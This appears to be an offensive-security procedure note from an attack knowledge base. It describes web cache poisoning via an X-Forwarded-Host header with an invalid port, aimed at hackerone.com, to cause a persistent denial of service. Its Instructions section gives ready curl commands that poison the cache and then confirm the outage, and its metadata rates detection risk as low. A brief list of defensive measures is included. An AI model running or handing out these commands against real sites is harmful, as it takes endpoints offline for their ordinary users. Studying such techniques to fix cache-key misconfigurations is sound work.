---
tags:
  - cache-poisoning
  - dos
  - x-forwarded-host
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-poison-x-forwarded-host]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 61ef75e3-050b-440b-b476-a9ccadc569ec
created_at: '2025-12-14T17:26:56.742Z'
updated_at: '2025-12-14T17:26:56.742Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# Poison-Cache-with-X-Forwarded-Host

## Summary

This procedure uses the X-Forwarded-Host header with an invalid port to poison the web cache, achieving the same DoS effect as port header manipulation but via an alternative vector.

## Description

Similar to X-Forwarded-Port, the caching system includes X-Forwarded-Host in the cache key. Setting it to 'www.hackerone.com:123' creates a poisoned entry where redirects point to the invalid port. This is useful if one header is sanitized but the other isn't, providing redundancy in the attack. The impact is persistent DoS on affected endpoints in Drupal/Acquia setups.

## Requirements

1. Network access to the target
2. HTTP client for custom headers (e.g., curl)
3. Target endpoint knowledge

## Defense

Defensive measures and detection strategies:

- Normalize or exclude X-Forwarded-Host from cache keys in VCL
- Validate host and port formats before caching
- Monitor logs for malformed host headers
- Implement header whitelisting

## Objectives

1. Poison cache using host header vector
2. Ensure attack reliability across vectors
3. Expose caching misconfigurations

## Instructions

### Step 1: Send Host-Poisoned Request

**Context**: Append an invalid port to the host in the header to alter the cache key.

**Command** ([[commands/curl-poison-x-forwarded-host]]):
```bash
curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1
```

> Successful response caches the poisoned redirect to port 123.

### Step 2: Confirm with Cache Hit

**Context**: Test without the header to trigger the poison.

**Command** (Standard curl):
```bash
curl https://www.hackerone.com/index.php?dontpoisoneveryone=1
```

> Connection failure confirms poisoning.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/curl-poison-x-forwarded-host]]

## Tools Used

- [[tools/curl]]

## Tags

- [[cache-poisoning]]
- [[dos]]
